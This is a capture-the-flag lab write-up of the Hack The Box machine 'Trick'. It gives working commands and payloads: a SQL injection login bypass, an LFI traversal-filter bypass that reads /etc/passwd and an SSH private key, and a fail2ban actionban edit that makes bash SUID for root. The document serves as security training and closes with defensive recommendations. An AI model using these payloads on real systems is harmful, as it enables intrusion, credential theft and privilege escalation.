# Trick — Hack The Box (CPTS practice)

**Platform:** Hack The Box
**Difficulty:** 🟢 Easy
**OS:** Linux
**Certification:** Extra practice for the CPTS (Certified Penetration Testing Specialist)
**Date completed:** 2026
**Techniques:** Nmap · DNS zone transfer (AXFR) · Subdomain fuzzing with `wfuzz` (response-size filtering) · **SQL Injection** login bypass · Credential exposed via DevTools · **LFI** (directory traversal) → `/etc/passwd` and a private SSH key · `sudo` abuse over `fail2ban` (`actionban`) → root
**Language:** English — [🇪🇸 Versión en español](./Trick_Writeup_ES.md)

---

## Table of contents
1. [Reconnaissance](#1-reconnaissance)
2. [Enumeration — DNS and subdomains](#2-enumeration--dns-and-subdomains)
3. [Initial access — SQL Injection and LFI](#3-initial-access--sql-injection-and-lfi)
4. [Getting a shell](#4-getting-a-shell)
   - [Privilege escalation — abusing `fail2ban`](#privilege-escalation--abusing-fail2ban)
5. [Post-exploitation and flags](#5-post-exploitation-and-flags)
6. [Lessons learned](#6-lessons-learned)
7. [Tool & command glossary](#7-tool--command-glossary)

---

## 1. Reconnaissance

```bash
ping -c 1 10.129.75.177
```

> 🛠️ **`ping`** — checks host availability via ICMP. A TTL of **63** (starting from 64) → **Linux**.

![](Imagenes/01-ping.png)

Full TCP port scan:

```bash
nmap -sS -Pn -vvv --min-rate 5000 --open -n -p- -oN AllPorts 10.129.75.177
```

> 🛠️ **`nmap -sS -Pn -vvv --min-rate 5000 --open -n -p-`** — a full SYN scan of all 65535 ports: `-sS` (stealthy), `-Pn` (ignore ping status), `--min-rate 5000` (speeds up sending), `--open` (only open ports), `-n` (no DNS resolution).

![](Imagenes/02-nmap-allports.png)

```bash
enum-nmap AllPorts
```

> 🛠️ **`enum-nmap`** — a custom script that summarizes Nmap's output: IP, TTL, estimated OS, and a port list ready for the next `-p`.

![](Imagenes/03-enum-nmap-herramienta-propia.png)

> 💡 4 open ports: **22 (SSH), 25 (SMTP), 53 (DNS), and 80 (HTTP)**. Running its own DNS service — unusual for a simple box — is the key hint: DNS enumeration is going to be central to the attack path.

Version and default-script scan:

```bash
nmap -sS -Pn -sCV -T5 -n -p22,25,53,80 -oN Ports 10.129.75.177
```

> 🛠️ **`-sCV`** combines `-sC` (Nmap's default scripts) with `-sV` (service version detection).

![](Imagenes/04-nmap-version-servicios.png)

```
80/tcp open  http  nginx 1.14.2
|_http-title: Coming Soon - Start Bootstrap Theme
```

## 2. Enumeration — DNS and subdomains

### Reverse resolution and domain discovery

```bash
dig @10.129.75.177 -x 10.129.75.177
```

> 🛠️ **`dig -x`** — performs a **reverse** DNS query (PTR): given an IP, it asks what domain name is associated with it. By pointing the query at the box's own DNS server (`@10.129.75.177`), we take advantage of it being authoritative for its own zone, so it can return information a public resolver wouldn't have.

![](Imagenes/05-dig-ptr-reverse-trick-htb.png)

```
177.75.129.10.in-addr.arpa. 604800 IN PTR trick.htb.
```

We add the domain to `/etc/hosts` so we can resolve it locally:

![](Imagenes/06-etc-hosts-trick-htb.png)

### What is a zone transfer (AXFR), and why is it dangerous?

A zone transfer is the legitimate mechanism a **secondary** DNS server uses to sync a zone's entire database from the **primary** server — under normal conditions, it should only be allowed for those explicitly authorized secondaries. If the server doesn't restrict who can request it, **any client** can ask for a full zone dump with a plain `dig axfr`, getting every configured DNS record at once: subdomains, internal hosts, mail records, and more — information that would otherwise have to be guessed or brute-forced one at a time.

```bash
dig @10.129.75.177 TRICK.HTB axfr
```

![](Imagenes/07-dig-axfr-subdominio-preprod-payroll.png)

```
preprod-payroll.trick.htb. 604800 IN CNAME trick.htb.
```

> 💡 The zone transfer directly leaks a subdomain (`preprod-payroll`) that's linked from nowhere visible — the name suggests a **pre-production** environment, usually less hardened than production.

We add the subdomain to `/etc/hosts`:

![](Imagenes/08-etc-hosts-preprod-payroll.png)

## 3. Initial access — SQL Injection and LFI

### Authentication bypass via SQL Injection

`preprod-payroll.trick.htb` hosts a **Recruitment Management System** (payroll/HR management):

![](Imagenes/09-login-preprod-payroll-recruitment.png)

We try a classic SQL injection authentication bypass:

```
Username: ' or 1=1-- -
Password: (anything)
```

> 🛠️ **`' or 1=1-- -`** — if the backend builds the login query by directly concatenating the field's value (e.g. `SELECT * FROM users WHERE username='<input>' AND password='...'`), this string closes the `username` field's quotes, adds an **always-true** condition (`OR 1=1`), and comments out (`-- -`) the rest of the original query (including the password check). The result: the query returns the table's first row without validating any real credential.

![](Imagenes/10-sqli-login-bypass-or-1-1.png)

Access granted as Administrator:

![](Imagenes/11-panel-administrador-recruitment-system.png)

The **Users** section shows the real admin account:

![](Imagenes/12-panel-users-administrador-enemigosss.png)

```
Username: Enemigosss
```

### Revealing a hidden password with developer tools

That user's edit form shows the password masked, with the HTML field marked as `type="password"` — but the **value itself** is already present in the DOM, just visually hidden by the browser.

```
Inspect element → change type="password" to type="text"
```

> 🛠️ **Editing DOM attributes with DevTools** — an `<input type="password">` field doesn't encrypt or genuinely protect its value in any way: it only changes how the browser *displays* it. By editing that attribute directly in the inspector, the browser renders the value already sitting in the field as plain text — no traffic interception or server access needed.

![](Imagenes/13-devtools-edit-user-password-revelada.png)

```
Password: SuperGucciRainbowCake
```

### Subdomain fuzzing with response-size filtering

We look for more pre-production subdomains using the `Host` header:

```bash
sudo wfuzz -c -t 200 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: preprod-FUZZ.trick.htb" http://trick.htb
```

> 🛠️ **`wfuzz -H "Host: preprod-FUZZ.trick.htb"`** — instead of fuzzing a path, this substitutes `FUZZ` inside the `Host` header of each request, discovering **virtual hosts** (subdomains served by the same nginx instance) without relying on a public DNS record for each one — the web server just has to recognize them.

![](Imagenes/14-wfuzz-subdominios-falsos-positivos.png)

> 💡 The server responds with a **200** status code even for subdomains that don't exist (it serves a default page), producing a huge list of false positives. The key to filtering them isn't the status code — it's that they **all share the same response size** (`5480` characters), the fingerprint of that default page.

```bash
sudo wfuzz -c --hh=5480 -t 200 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: preprod-FUZZ.trick.htb" http://trick.htb
```

> 🛠️ **`--hh=<size>`** (*hide by hash/chars*) — hides from the results any response whose character size matches the given value. It's the standard technique for eliminating false positives when the status code alone can't tell real content apart from a generic page.

![](Imagenes/15-wfuzz-filtro-hh-subdominio-marketing.png)

```
"marketing" → 200, 178 L, 631 W, 9660 Ch
```

With the noise filtered out, a single genuine result shows up. We add `preprod-marketing.trick.htb` to `/etc/hosts`:

![](Imagenes/16-etc-hosts-preprod-marketing.png)

### What is LFI, and how do you bypass a basic traversal filter?

The new site loads content dynamically through a `page` parameter:

```
http://preprod-marketing.trick.htb/index.php?page=services.html
```

![](Imagenes/17-web-preprod-marketing-services.png)

> 💡 An **LFI (Local File Inclusion)** happens when an application uses a user-controlled parameter to decide which file **on the server itself** to include/load, without restricting it to a closed list of legitimate options. If the value isn't sanitized, it can be swapped for an arbitrary filesystem path.

A naive anti-traversal filter usually just strips the literal string `../` from the input — but only **once**, not recursively. The `....//` pattern exploits exactly that flaw: stripping `../` from the middle of `....//` leaves `../` behind again, reconstructing the directory-escape sequence the filter thought it had neutralized.

```
http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//....//....//....//etc/passwd
```

![](Imagenes/18-lfi-etc-passwd-traversal.png)
![](Imagenes/19-etc-passwd-usuario-michael.png)

```
michael:x:1001:1001::/home/michael:/bin/bash
```

With a system user identified, we reuse the same LFI to try reading their private SSH key:

```
view-source:http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//....//....//....//home/michael/.ssh/id_rsa
```

> 🛠️ **`view-source:`** — a Firefox/Chrome prefix that forces the HTTP response to be shown as plain text without interpretation, keeping the browser from trying to render the key's content as HTML.

![](Imagenes/20-lfi-ssh-id-rsa-michael.png)

## 4. Getting a shell

```bash
chmod 600 id_rsa
```

> 🛠️ **`chmod 600`** — restricts the private key to read/write access for the owner only. OpenSSH refuses keys with more permissive modes for security reasons.

![](Imagenes/21-chmod-600-id-rsa.png)

```bash
ssh -i id_rsa michael@10.129.75.177
```

![](Imagenes/22-ssh-login-michael-user-txt.png)

```
ls
Desktop Documents Downloads Music Pictures Public Templates user.txt Videos
```

`user.txt` confirmed in `michael`'s home directory — first flag.

## Privilege escalation — abusing `fail2ban`

```bash
sudo -l
```

> 🛠️ **`sudo -l`** — lists the commands the current user can run with elevated privileges via `sudo`, the mandatory first check in any Linux privilege escalation.

![](Imagenes/23-sudo-l-fail2ban-restart.png)

```
User michael may run the following commands on trick:
    (root) NOPASSWD: /etc/init.d/fail2ban restart
```

Restarting a service alone doesn't look exploitable on its own — so we inspect its configuration files:

```bash
cd /etc/fail2ban
ls -la
```

![](Imagenes/24-fail2ban-action-d-permisos-grupo-security.png)

```
drwxrwx--- 2 root root security 4096 action.d
```

### Why is this combination exploitable?

**fail2ban** is a service that watches log files (typically SSH's) and, upon detecting a configurable number of failed login attempts from the same IP within a short window, runs a **ban action** (`actionban`) — usually an `iptables` rule that blocks that IP. Those actions are defined in `.conf` files inside `action.d/`, and they're **always run as root**, since only root can modify firewall rules.

The `action.d` directory belongs to the **`security`** group, of which `michael` is a member, with **group write** permission (`rwxrwx---`). That means `michael` can **modify what command fail2ban runs when it bans an IP** — and, thanks to the passwordless `sudo` over `/etc/init.d/fail2ban restart`, can reload that modified configuration without ever needing root's actual password. (Technique reference: [infosecwriteups.com — Fail2ban Privilege Escalation](https://infosecwriteups.com/fail2ban-privilege-escalation-5de164aff6f3).)

We modify the `actionban` action of the jail that watches SSH:

```bash
mv iptables-multiport.conf .old
cp .old iptables-multiport.conf
nano iptables-multiport.conf
```

> 🛠️ **`mv`/`cp` before editing** — keeps a backup of the original file, good practice before modifying a system configuration, even though here the end goal is abuse, not restoration.

![](Imagenes/25-backup-editar-iptables-multiport-conf.png)

```ini
actionban = chmod u+s /bin/bash
```

> 💡 We replace the real ban action with an arbitrary command. Since `actionban` runs as **root**, this `chmod u+s /bin/bash` will set the **SUID** bit on `/bin/bash` the exact moment fail2ban detects and bans an IP — turning execution of that binary into a direct path to a root-privileged shell for anyone who runs it afterward.

![](Imagenes/26-actionban-chmod-u-s-bin-bash.png)

We restart fail2ban so it reloads the modified configuration, using the passwordless `sudo` permission:

```bash
sudo /etc/init.d/fail2ban restart
```

In one terminal, we watch `/bin/bash`'s permissions while we trigger the ban:

```bash
watch -n 2 'ls -la /bin/bash'
```

> 🛠️ **`watch -n 2 '<command>'`** — repeats a command every 2 seconds, refreshing the display; useful for observing the exact moment a file's state changes in real time.

![](Imagenes/27-watch-bin-bash-permisos-antes.png)

In another terminal, we force several failed SSH login attempts against the box itself to cross the retry threshold configured in fail2ban's jail:

```bash
for i in {1..10}; do sshpass -p '1213' ssh michael@10.129.75.177; done
```

> 🛠️ **`sshpass -p`** — automates sending a password to `ssh` with no manual interaction, letting us repeat failed login attempts in a quick loop to trip fail2ban's ban threshold.

![](Imagenes/28-sshpass-fuerza-bruta-ssh-loop.png)

As soon as fail2ban bans the IP, it runs `actionban` as root — applying our injected `chmod u+s /bin/bash`:

![](Imagenes/29-watch-bin-bash-suid-establecido.png)

```
-rwsr-xr-x 1 root root 1168776 /bin/bash
```

With the SUID bit set, we get a root-privileged shell:

```bash
bash -p
```

> 🛠️ **`bash -p`** (*privileged mode*) — when `bash` has the SUID bit set, running it with `-p` stops the shell from automatically "dropping" its effective UID back to the real UID on startup (bash's default safety behavior around SUID), preserving the root privileges inherited from the SUID bit.

![](Imagenes/30-bash-p-shell-root.png)

## 5. Post-exploitation and flags

```
ls
```

![](Imagenes/31-ls-root-txt.png)

`root.txt` confirmed — full system compromise.

> 🔒 The exact contents of `user.txt` and `root.txt` aren't published in this writeup on purpose, so anyone practicing this same box still has to complete that last step themselves — the full path to each one is documented in §4 and §5.

## 6. Lessons learned

| Vulnerability | Where | Impact |
|----------------|-------|---------|
| DNS zone transfer (AXFR) allowed for any client | Port 53 | Leaks internal subdomains not publicly linked |
| Login form vulnerable to SQL Injection | `preprod-payroll.trick.htb` | Full authentication bypass as Administrator |
| Password recoverable by changing an HTML field's type via DevTools | User edit panel | Credential theft with zero server-side exploitation |
| Additional unlinked subdomain, only discoverable via vhost brute-forcing | `preprod-marketing.trick.htb` | Exposes extra attack surface never meant to be public |
| LFI via an unsanitized `page` parameter, vulnerable to a trivial filter bypass | `index.php?page=` | Arbitrary file read on the system, including private SSH keys |
| `sudo` to restart fail2ban combined with group write access over `action.d` | `/etc/fail2ban/action.d` | Lets an attacker inject an arbitrary action that runs as root when an IP gets banned |

## Defensive recommendations

- Restrict DNS zone transfers (AXFR) to explicitly authorized secondary servers only.
- Always use parameterized queries/prepared statements to prevent SQL Injection; never concatenate user input into SQL.
- Never rely on client-side obfuscation (`type="password"`) as a security measure — the value is always present in the DOM.
- Don't rely on "security through obscurity" for internal subdomains; protect them with real authentication if they shouldn't be public.
- Strictly validate and sanitize any parameter used to include files, using allow-lists instead of trying to filter traversal patterns (single-pass filters are bypassable with patterns like `....//`).
- Restrict write access to fail2ban's configuration directories (`action.d`, `filter.d`) to `root` only.
- Regularly audit granted `sudo` rules, especially when the allowed binary can reload a configuration writable by the user themselves.

## 7. Tool & command glossary

| Tool / command | What it's for |
|------------------|-----------------|
| `ping` / `nmap` | Host discovery and port/service enumeration |
| `enum-nmap` | Custom script that summarizes Nmap's output |
| `dig -x` | Reverse DNS query (PTR): gets the domain name associated with an IP |
| `dig axfr` | Requests a full DNS zone transfer; if the server doesn't restrict it, leaks every record, internal subdomains included |
| **SQL Injection login bypass** (`' or 1=1-- -`) | Manipulates the backend's SQL query so it returns a valid row without knowing any real credential |
| **Editing DOM attributes with DevTools** | Reveals values already present in the HTML but visually hidden (like `type="password"`), without intercepting any traffic |
| `wfuzz -H "Host: FUZZ..."` | Fuzzes virtual hosts by substituting the `Host` header's value, discovering subdomains served by the same web server |
| `--hh=<size>` (wfuzz) | Hides responses of a given character size, filtering false positives when the status code alone can't tell real content apart |
| **LFI (Local File Inclusion)** | Inclusion of arbitrary server-side files through an unsanitized parameter |
| `....//` (traversal bypass) | Bypasses filters that strip `../` only once: removing the middle match reconstructs the pattern into `../` |
| `view-source:` | Forces the browser to show a response as plain text without interpreting it |
| `chmod 600` | Restricts an SSH private key to owner-only read/write, an OpenSSH requirement |
| `sudo -l` | Lists the commands the current user can run with elevated privileges |
| **fail2ban / `actionban`** | A service that bans IPs after failed login attempts, running a configurable action as root — if that configuration is writable by an unprivileged user, it's a direct escalation path |
| `watch -n <sec> '<command>'` | Repeats a command periodically, useful for observing state changes in real time |
| `sshpass -p` | Automates sending passwords to `ssh`, useful for forcing failed login attempts in a loop |
| `bash -p` | Runs bash in privileged mode, preserving the effective UID inherited from a SUID bit instead of dropping it to the real UID |

---

*Written by [Arabot](https://github.com/Caan31) · Hack The Box · CPTS practice · 2026*
